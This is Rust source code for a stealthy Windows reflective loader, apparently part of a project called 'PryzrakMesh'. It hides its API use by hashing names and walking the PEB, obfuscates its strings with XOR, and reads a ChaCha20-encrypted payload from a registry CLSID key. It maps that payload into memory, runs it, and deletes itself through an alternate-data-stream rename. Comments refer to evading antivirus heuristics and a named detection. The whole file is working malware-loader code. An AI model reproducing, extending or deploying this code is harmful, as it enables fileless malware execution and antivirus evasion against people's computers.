#![no_main]
#![windows_subsystem = "windows"]
#![allow(non_snake_case)]
#![allow(non_camel_case_types)]
#![allow(dead_code)]

//! # Reflective Loader (Dynamic API - Minimal Imports)
//!
//! Uses PEB walking + DJB2 hashing for ALL API resolution.
//! NO winreg, NO windows-sys = minimal import table.

use std::ptr;
use std::mem;
use std::ffi::c_void;

// Inline ChaCha20 - minimal implementation (no external deps)
struct ChaCha20 {
    state: [u32; 16],
    keystream: [u8; 64],
    pos: usize,
}

impl ChaCha20 {
    fn new(key: &[u8; 32], nonce: &[u8; 12]) -> Self {
        let mut state = [0u32; 16];
// Obfuscated Constants (XOR 0x55555555)
        // Original: 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574
        state[0] = 0x34252d30 ^ 0x55555555;
        state[1] = 0x6675313b ^ 0x55555555;
        state[2] = 0x2c377867 ^ 0x55555555;
        state[3] = 0x3e753021 ^ 0x55555555;
        
        for i in 0..8 {
            state[4 + i] = u32::from_le_bytes([key[i*4], key[i*4+1], key[i*4+2], key[i*4+3]]);
        }
        
        state[12] = 0;
        for i in 0..3 {
            state[13 + i] = u32::from_le_bytes([nonce[i*4], nonce[i*4+1], nonce[i*4+2], nonce[i*4+3]]);
        }
        
        Self { state, keystream: [0; 64], pos: 64 }
    }
    
    fn apply_keystream(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            if self.pos >= 64 {
                self.generate_block();
                self.pos = 0;
            }
            *byte ^= self.keystream[self.pos];
            self.pos += 1;
        }
    }
    
    fn generate_block(&mut self) {
        let mut x = self.state;
        
        for _ in 0..10 {
            Self::qr(&mut x, 0, 4, 8, 12);
            Self::qr(&mut x, 1, 5, 9, 13);
            Self::qr(&mut x, 2, 6, 10, 14);
            Self::qr(&mut x, 3, 7, 11, 15);
            Self::qr(&mut x, 0, 5, 10, 15);
            Self::qr(&mut x, 1, 6, 11, 12);
            Self::qr(&mut x, 2, 7, 8, 13);
            Self::qr(&mut x, 3, 4, 9, 14);
        }
        
        for i in 0..16 {
            x[i] = x[i].wrapping_add(self.state[i]);
            let bytes = x[i].to_le_bytes();
            self.keystream[i*4..(i+1)*4].copy_from_slice(&bytes);
        }
        
        self.state[12] = self.state[12].wrapping_add(1);
    }
    
    #[inline(always)]
    fn qr(x: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
        x[a] = x[a].wrapping_add(x[b]); x[d] ^= x[a]; x[d] = x[d].rotate_left(16);
        x[c] = x[c].wrapping_add(x[d]); x[b] ^= x[c]; x[b] = x[b].rotate_left(12);
        x[a] = x[a].wrapping_add(x[b]); x[d] ^= x[a]; x[d] = x[d].rotate_left(8);
        x[c] = x[c].wrapping_add(x[d]); x[b] ^= x[c]; x[b] = x[b].rotate_left(7);
    }
}

// ============================================================================
// DJB2 HASH (Compile-time)
// ============================================================================

pub const fn djb2(s: &[u8]) -> u32 {
    let mut hash: u32 = 5381;
    let mut i = 0;
    while i < s.len() {
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ (s[i] as u32);
        i += 1;
    }
    hash
}

// API Hashes (Verified)
const HASH_KERNEL32: u32 = 0x3E003875;
const HASH_NTDLL: u32 = 0xE91AAD51;
const HASH_ADVAPI32: u32 = 0x03C6B585;

const HASH_VIRTUAL_ALLOC: u32 = 0x19FBBF49;
const HASH_VIRTUAL_PROTECT: u32 = 0x17EA484F;
const HASH_LOAD_LIBRARY_A: u32 = 0x01ED9ADD;
const HASH_GET_PROC_ADDRESS: u32 = 0xAADFAB0B;
const HASH_GET_MODULE_FILE_NAME_A: u32 = 0xE60575E9;
const HASH_CREATE_PROCESS_A: u32 = 0x5768C90B;
const HASH_CLOSE_HANDLE: u32 = 0x687C0D79;
const HASH_REG_OPEN_KEY_EX_W: u32 = 0x9139725C;
const HASH_REG_QUERY_VALUE_EX_W: u32 = 0x6383195E;
const HASH_REG_CLOSE_KEY: u32 = 0x66579AD4;
const HASH_CREATE_FILE_A: u32 = 0xCDF70C26;
const HASH_SET_FILE_INFO: u32 = 0x01C5A2BC;

// ============================================================================
// XOR HELPER
// ============================================================================

fn x(bytes: &[u8]) -> String {
    let key = 0x55;
    let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
    String::from_utf8(decoded).unwrap_or_default()
}

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ============================================================================
// CONSTANTS
// ============================================================================

// ChaCha20 Key (32 bytes) - XOR Obfuscated at compile time
// Key 0x55: "PryzrakMeshKey2026_SecretKey!@#$"
const CHACHA_KEY_ENC: [u8; 32] = [
    0x05, 0x3d, 0x34, 0x3b, 0x21, 0x3a, 0x38, 0x18,
    0x30, 0x26, 0x3d, 0x1e, 0x30, 0x2c, 0x67, 0x65,
    0x67, 0x63, 0x0a, 0x06, 0x30, 0x36, 0x26, 0x30,
    0x21, 0x1e, 0x30, 0x2c, 0x74, 0x15, 0x76, 0x71,
];

// Nonce (12 bytes) - XOR Obfuscated: "PHMNONCE0001"
const CHACHA_NONCE_ENC: [u8; 12] = [0x05, 0x1d, 0x18, 0x1b, 0x1a, 0x1b, 0x16, 0x10, 0x65, 0x65, 0x65, 0x64];
const KEY_XOR: u8 = 0x55;

/// Decode key at runtime
fn get_key() -> [u8; 32] {
    let mut k = CHACHA_KEY_ENC;
    for b in k.iter_mut() { *b ^= KEY_XOR; }
    k
}

fn get_nonce() -> [u8; 12] {
    let mut n = CHACHA_NONCE_ENC;
    for b in n.iter_mut() { *b ^= KEY_XOR; }
    n
}

const HKEY_CURRENT_USER: isize = 0x80000001u32 as isize;
const KEY_READ: u32 = 0x20019;
const REG_SZ: u32 = 1;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40; // RWX needed for mutable globals in raw payload
const CREATE_NO_WINDOW: u32 = 0x08000000;

// ============================================================================
// PE STRUCTURES
// ============================================================================

#[repr(C)]
struct IMAGE_DOS_HEADER { e_magic: u16, _pad: [u8; 58], e_lfanew: i32 }

#[repr(C)]
struct IMAGE_NT_HEADERS64 { Signature: u32, FileHeader: IMAGE_FILE_HEADER, OptionalHeader: IMAGE_OPTIONAL_HEADER64 }

#[repr(C)]
struct IMAGE_FILE_HEADER { Machine: u16, NumberOfSections: u16, TimeDateStamp: u32, PointerToSymbolTable: u32, NumberOfSymbols: u32, SizeOfOptionalHeader: u16, Characteristics: u16 }

#[repr(C)]
struct IMAGE_OPTIONAL_HEADER64 {
    Magic: u16, MajorLinkerVersion: u8, MinorLinkerVersion: u8,
    SizeOfCode: u32, SizeOfInitializedData: u32, SizeOfUninitializedData: u32,
    AddressOfEntryPoint: u32, BaseOfCode: u32, ImageBase: u64,
    SectionAlignment: u32, FileAlignment: u32,
    MajorOSVersion: u16, MinorOSVersion: u16, MajorImageVersion: u16, MinorImageVersion: u16,
    MajorSubsystemVersion: u16, MinorSubsystemVersion: u16, Win32VersionValue: u32,
    SizeOfImage: u32, SizeOfHeaders: u32, CheckSum: u32, Subsystem: u16, DllCharacteristics: u16,
    SizeOfStackReserve: u64, SizeOfStackCommit: u64, SizeOfHeapReserve: u64, SizeOfHeapCommit: u64,
    LoaderFlags: u32, NumberOfRvaAndSizes: u32, DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
}

#[repr(C)]
#[derive(Clone, Copy)]
struct IMAGE_DATA_DIRECTORY { VirtualAddress: u32, Size: u32 }

#[repr(C)]
struct IMAGE_SECTION_HEADER { Name: [u8; 8], VirtualSize: u32, VirtualAddress: u32, SizeOfRawData: u32, PointerToRawData: u32, _pad: [u32; 3], Characteristics: u32 }

#[repr(C)]
struct IMAGE_BASE_RELOCATION { VirtualAddress: u32, SizeOfBlock: u32 }

#[repr(C)]
struct IMAGE_IMPORT_DESCRIPTOR { OriginalFirstThunk: u32, TimeDateStamp: u32, ForwarderChain: u32, Name: u32, FirstThunk: u32 }

#[repr(C)]
struct STARTUPINFOA { cb: u32, _reserved: [*const u8; 3], _dw: [u32; 8], _flags: u32, wShowWindow: u16, _pad: [u8; 6], _handles: [isize; 3] }

#[repr(C)]
struct PROCESS_INFORMATION { hProcess: isize, hThread: isize, dwProcessId: u32, dwThreadId: u32 }

// ============================================================================
// API TYPES
// ============================================================================

type FnVa = unsafe extern "system" fn(*const c_void, usize, u32, u32) -> *mut c_void;
type FnVp = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
type FnLl = unsafe extern "system" fn(*const u8) -> isize;
type FnGp = unsafe extern "system" fn(isize, *const u8) -> Option<unsafe extern "system" fn()>;
type FnMf = unsafe extern "system" fn(isize, *mut u8, u32) -> u32;
type FnCp = unsafe extern "system" fn(*const u8, *mut u8, *const c_void, *const c_void, i32, u32, *const c_void, *const u8, *const STARTUPINFOA, *mut PROCESS_INFORMATION) -> i32;
type FnCh = unsafe extern "system" fn(isize) -> i32;
type FnRo = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
type FnRq = unsafe extern "system" fn(isize, *const u16, *const u32, *mut u32, *mut u8, *mut u32) -> i32;
type FnRc = unsafe extern "system" fn(isize) -> i32;

// ============================================================================
// PEB WALKING API RESOLUTION
// ============================================================================

#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn get_module_by_hash(target_hash: u32) -> Option<*const c_void> {
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    
    let ldr = *(peb.add(0x18) as *const *const u8);
    let list_head = ldr.add(0x20);
    let mut entry = *(list_head as *const *const u8);
    let head = entry;
    
    while !entry.is_null() {
        let base = *((entry as usize + 0x20) as *const *const c_void);
        let name_ptr = *((entry as usize + 0x50) as *const *const u16);
        let name_len = *((entry as usize + 0x48) as *const u16) as usize / 2;
        
        if !name_ptr.is_null() && name_len > 0 {
            let hash = djb2_wide(name_ptr, name_len);
            if hash == target_hash { return Some(base); }
        }
        
        entry = *(entry as *const *const u8);
        if entry == head { break; }
    }
    None
}

fn djb2_wide(s: *const u16, len: usize) -> u32 {
    let mut hash: u32 = 5381;
    for i in 0..len {
        let c = unsafe { *s.add(i) } as u32;
        let c_lower = if c >= 65 && c <= 90 { c + 32 } else { c };
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ c_lower;
    }
    hash
}

unsafe fn get_export_by_hash(module: *const c_void, func_hash: u32) -> Option<*const c_void> {
    if module.is_null() { return None; }
    
    let dos = module as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    let export_rva = *((nt as usize + 0x88) as *const u32);
    if export_rva == 0 { return None; }
    
    #[repr(C)]
    struct ExportDir { _pad: [u32; 6], num_funcs: u32, num_names: u32, addr_funcs: u32, addr_names: u32, addr_ordinals: u32 }
    
    let export = dos.add(export_rva as usize) as *const ExportDir;
    let names = dos.add((*export).addr_names as usize) as *const u32;
    let funcs = dos.add((*export).addr_funcs as usize) as *const u32;
    let ordinals = dos.add((*export).addr_ordinals as usize) as *const u16;
    
    for i in 0..(*export).num_names as usize {
        let name_rva = *names.add(i);
        let name_ptr = dos.add(name_rva as usize);
        
        let mut len = 0;
        while *name_ptr.add(len) != 0 { len += 1; }
        let hash = djb2(std::slice::from_raw_parts(name_ptr, len));
        
        if hash == func_hash {
            let ordinal = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ordinal);
            return Some(dos.add(func_rva as usize) as *const c_void);
        }
    }
    None
}

unsafe fn resolve_api<T>(module_hash: u32, func_hash: u32) -> Option<T> {
    let module = get_module_by_hash(module_hash)?;
    let func = get_export_by_hash(module, func_hash)?;
    Some(mem::transmute_copy(&func))
}

// ============================================================================
// MAIN ENTRY
// ============================================================================

#[no_mangle]
#[cfg(windows)]
pub extern "system" fn WinMain(_: isize, _: isize, _: *const u8, _: i32) -> i32 {
    unsafe { if run_loader().is_err() { return 1; } }
    0
}

#[cfg(windows)]
unsafe fn run_loader() -> Result<(), ()> {
    let payload = read_registry_payload()?;
    let decrypted = decrypt_payload(payload)?;
    let entry = reflective_load(&decrypted)?;
    schedule_self_delete();
    let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry);
    entry_fn();
    Ok(())
}

// ============================================================================
// REGISTRY READ (NATIVE API)
// ============================================================================

#[cfg(windows)]
unsafe fn read_registry_payload() -> Result<Vec<u8>, ()> {
    // Load advapi32
    let load_lib: FnLl = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A).ok_or(())?;
    // "advapi32.dll\0" XOR 0x55
    let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
    let mut dll_dec: [u8; 13] = [0; 13];
    for i in 0..13 { dll_dec[i] = dll_enc[i] ^ 0x55; }
    load_lib(dll_dec.as_ptr());
    
    let advapi32 = get_module_by_hash(HASH_ADVAPI32).ok_or(())?;
    let fn_ro: FnRo = mem::transmute(get_export_by_hash(advapi32, HASH_REG_OPEN_KEY_EX_W).ok_or(())?);
    let fn_rq: FnRq = mem::transmute(get_export_by_hash(advapi32, HASH_REG_QUERY_VALUE_EX_W).ok_or(())?);
    let fn_rc: FnRc = mem::transmute(get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY).ok_or(())?);
    
    // Build path
    let p1 = x(&[0x06, 0x3A, 0x33, 0x21, 0x22, 0x34, 0x27, 0x30]);
    let p2 = x(&[0x16, 0x39, 0x34, 0x26, 0x26, 0x30, 0x26]);
    let p3 = x(&[0x16, 0x19, 0x06, 0x1C, 0x11]);
    let clsid = "{e403d151-54b0-466d-8958-69225785f78a}";
    let path = format!("{}\\{}\\{}\\{}", p1, p2, p3, clsid);
    let path_wide = to_wide(&path);
    
    // Open key
    let mut hkey: isize = 0;
    if fn_ro(HKEY_CURRENT_USER, path_wide.as_ptr(), 0, KEY_READ, &mut hkey) != 0 { return Err(()); }
    
    // Query size
    let val_name = x(&[0x05, 0x34, 0x2C, 0x39, 0x3A, 0x34, 0x31]);
    let val_wide = to_wide(&val_name);
    let mut size: u32 = 0;
    let mut dtype: u32 = 0;
    fn_rq(hkey, val_wide.as_ptr(), ptr::null(), &mut dtype, ptr::null_mut(), &mut size);
    
    // Read value
    let mut buffer: Vec<u8> = vec![0; size as usize];
    if fn_rq(hkey, val_wide.as_ptr(), ptr::null(), &mut dtype, buffer.as_mut_ptr(), &mut size) != 0 {
        fn_rc(hkey);
        return Err(());
    }
    fn_rc(hkey);
    
    // Convert from wide string to UTF-8
    let wide_slice: &[u16] = std::slice::from_raw_parts(buffer.as_ptr() as *const u16, size as usize / 2);
    let b64_str: String = String::from_utf16_lossy(wide_slice).trim_matches('\0').to_string();
    
    // Base64 decode
    base64_decode(&b64_str)
}

fn base64_decode(input: &str) -> Result<Vec<u8>, ()> {
    const TABLE: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut output = Vec::new();
    let mut buf: u32 = 0;
    let mut bits: u8 = 0;
    
    for c in input.bytes() {
        if c == b'=' { break; }
        let val = TABLE.iter().position(|&x| x == c).ok_or(())? as u32;
        buf = (buf << 6) | val;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            output.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Ok(output)
}

unsafe fn decrypt_payload(mut data: Vec<u8>) -> Result<Vec<u8>, ()> {
    let mut cipher = ChaCha20::new(&get_key(), &get_nonce());
    cipher.apply_keystream(&mut data);
    Ok(data)
}

// ============================================================================
// REFLECTIVE LOADER
// ============================================================================

#[cfg(windows)]
unsafe fn reflective_load(pe_data: &[u8]) -> Result<*const c_void, ()> {
    let fn_va: FnVa = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_ALLOC).ok_or(())?;
    let fn_vp: FnVp = resolve_api(HASH_KERNEL32, HASH_VIRTUAL_PROTECT).ok_or(())?;
    let fn_ll: FnLl = resolve_api(HASH_KERNEL32, HASH_LOAD_LIBRARY_A).ok_or(())?;
    let fn_gp: FnGp = resolve_api(HASH_KERNEL32, HASH_GET_PROC_ADDRESS).ok_or(())?;
    
    let dos = pe_data.as_ptr() as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != 0x5A4D { return Err(()); }
    
    let nt = pe_data.as_ptr().add((*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != 0x00004550 { return Err(()); }
    
    let opt = &(*nt).OptionalHeader;
    let file_hdr = &(*nt).FileHeader;
    
    let image_base = fn_va(ptr::null(), opt.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if image_base.is_null() { return Err(()); }
    
    ptr::copy_nonoverlapping(pe_data.as_ptr(), image_base as *mut u8, opt.SizeOfHeaders as usize);
    
    let sections_base = (nt as usize + 24 + file_hdr.SizeOfOptionalHeader as usize) as *const IMAGE_SECTION_HEADER;
    for i in 0..file_hdr.NumberOfSections as usize {
        let section = &*sections_base.add(i);
        if section.SizeOfRawData == 0 { continue; }
        let dest = (image_base as usize + section.VirtualAddress as usize) as *mut u8;
        let src = pe_data.as_ptr().add(section.PointerToRawData as usize);
        ptr::copy_nonoverlapping(src, dest, section.SizeOfRawData as usize);
    }
    
    let delta = image_base as i64 - opt.ImageBase as i64;
    if delta != 0 { process_relocations(image_base, opt, delta)?; }
    
    resolve_imports(image_base, opt, fn_ll, fn_gp)?;
    

    
    // Strict Section Permissions (Anti-Heuristic)
    // Map headers as ReadOnly
    let mut old_prot: u32 = 0;
    fn_vp(image_base, opt.SizeOfHeaders as usize, 0x02, &mut old_prot); // PAGE_READONLY
    
    // Process Sections
    for i in 0..file_hdr.NumberOfSections as usize {
        let section = &*sections_base.add(i);
        if section.SizeOfRawData == 0 && section.VirtualSize == 0 { continue; }
        
        let dest = (image_base as usize + section.VirtualAddress as usize) as *mut c_void;
        let size = section.VirtualSize as usize; // Virtual Size matters for memory protection
        
        let chars = section.Characteristics;
        let x = (chars & 0x20000000) != 0;
        let r = (chars & 0x40000000) != 0;
        let w = (chars & 0x80000000) != 0;
        
        // Default: NOACCESS(1)
        let mut prot = 0x01; 
        
        if x {
            if w { prot = 0x40; } // PAGE_EXECUTE_READWRITE (Avoid if possible)
            else { prot = 0x20; } // PAGE_EXECUTE_READ
        } else {
            if w { prot = 0x04; } // PAGE_READWRITE
            else if r { prot = 0x02; } // PAGE_READONLY
        }
        
        if (chars & 0x02000000) != 0 { // DISCARDABLE
             // can free or no-access
        }
        
        if size > 0 {
            fn_vp(dest, size, prot, &mut old_prot);
        }
    }
    
    // flush instruction cache? NtFlushInstructionCache is good practice but we lack hash.
    // Kernel handles it on VP changes usually.
    
    Ok((image_base as usize + opt.AddressOfEntryPoint as usize) as *const c_void)
}

unsafe fn process_relocations(base: *mut c_void, opt: &IMAGE_OPTIONAL_HEADER64, delta: i64) -> Result<(), ()> {
    let reloc_dir = &opt.DataDirectory[5];
    if reloc_dir.VirtualAddress == 0 { return Ok(()); }
    
    let mut reloc = (base as usize + reloc_dir.VirtualAddress as usize) as *const IMAGE_BASE_RELOCATION;
    let reloc_end = (base as usize + reloc_dir.VirtualAddress as usize + reloc_dir.Size as usize) as *const u8;
    
    while (reloc as *const u8) < reloc_end && (*reloc).SizeOfBlock > 0 {
        let block_base = base as usize + (*reloc).VirtualAddress as usize;
        let entry_count = ((*reloc).SizeOfBlock as usize - 8) / 2;
        let entries = (reloc as usize + 8) as *const u16;
        
        for i in 0..entry_count {
            let entry = *entries.add(i);
            if (entry >> 12) == 10 {
                let addr = (block_base + (entry & 0xFFF) as usize) as *mut i64;
                *addr += delta;
            }
        }
        reloc = (reloc as usize + (*reloc).SizeOfBlock as usize) as *const IMAGE_BASE_RELOCATION;
    }
    Ok(())
}

unsafe fn resolve_imports(base: *mut c_void, opt: &IMAGE_OPTIONAL_HEADER64, fn_ll: FnLl, fn_gp: FnGp) -> Result<(), ()> {
    let import_dir = &opt.DataDirectory[1];
    if import_dir.VirtualAddress == 0 { return Ok(()); }
    
    let mut import = (base as usize + import_dir.VirtualAddress as usize) as *const IMAGE_IMPORT_DESCRIPTOR;
    
    while (*import).Name != 0 {
        let dll_name = (base as usize + (*import).Name as usize) as *const u8;
        let dll = fn_ll(dll_name);
        if dll == 0 { return Err(()); }
        
        let mut thunk = (base as usize + (*import).FirstThunk as usize) as *mut usize;
        let orig = if (*import).OriginalFirstThunk != 0 { (base as usize + (*import).OriginalFirstThunk as usize) as *const usize } else { thunk as *const usize };
        let mut orig_thunk = orig;
        
        while *orig_thunk != 0 {
            let addr = if (*orig_thunk & (1usize << 63)) != 0 {
                fn_gp(dll, (*orig_thunk & 0xFFFF) as *const u8)
            } else {
                fn_gp(dll, (base as usize + *orig_thunk as usize + 2) as *const u8)
            };
            if addr.is_none() { return Err(()); }
            *thunk = addr.unwrap() as usize;
            thunk = thunk.add(1);
            orig_thunk = orig_thunk.add(1);
        }
        import = import.add(1);
    }
    Ok(())
}

// ============================================================================
// SELF-DELETE
// ============================================================================

#[cfg(windows)]
unsafe fn schedule_self_delete() {
    let fn_mf: FnMf = match resolve_api(HASH_KERNEL32, HASH_GET_MODULE_FILE_NAME_A) {
        Some(f) => f,
        None => return,
    };
    
    // Resolve new APIs
    type FnCfa = unsafe extern "system" fn(*const u8, u32, u32, *const c_void, u32, u32, isize) -> isize;
    type FnSfi = unsafe extern "system" fn(isize, u32, *const c_void, u32) -> i32;
    type FnCh = unsafe extern "system" fn(isize) -> i32;
    
    let fn_cfa: FnCfa = match resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_A) { Some(f) => f, None => return };
    let fn_sfi: FnSfi = match resolve_api(HASH_KERNEL32, HASH_SET_FILE_INFO) { Some(f) => f, None => return };
    let fn_ch: FnCh = match resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE) { Some(f) => f, None => return };

    let mut path = [0u8; 260];
    fn_mf(0, path.as_mut_ptr(), 260);
    
    // 1. Open for Rename (DELETE | SYNCHRONIZE = 0x10000 | 0x00100000)
    let h1 = fn_cfa(path.as_ptr(), 0x110000, 7, ptr::null(), 3, 0, 0);
    if h1 == -1 {
        // Fallback: try cmd if native fails? No, avoid Wacatac.
        return; 
    }
    
    // 2. Rename to ADS ":s"
    #[repr(C)]
    struct FileRenameInfo {
        replace: u8,
        root: isize,
        len: u32,
        name: [u16; 2], 
    }
    let mut rename_info = FileRenameInfo {
        replace: 0,
        root: 0,
        len: 4, // 2 chars * 2 bytes
        name: [ ':' as u16, 's' as u16 ],
    };
    
    fn_sfi(h1, 3, &rename_info as *const _ as *const c_void, mem::size_of::<FileRenameInfo>() as u32);
    fn_ch(h1);
    
    // 3. Open for Deletion
    let h2 = fn_cfa(path.as_ptr(), 0x110000, 7, ptr::null(), 3, 0, 0);
    if h2 == -1 { return; }
    
    #[repr(C)]
    struct FileDispInfo { delete: u8 }
    let disp_info = FileDispInfo { delete: 1 };
    
    // Class 21 = FileDispositionInfo
    fn_sfi(h2, 21, &disp_info as *const _ as *const c_void, mem::size_of::<FileDispInfo>() as u32);
    fn_ch(h2); // Trigger deletion
}

#[cfg(not(windows))]
fn main() {}
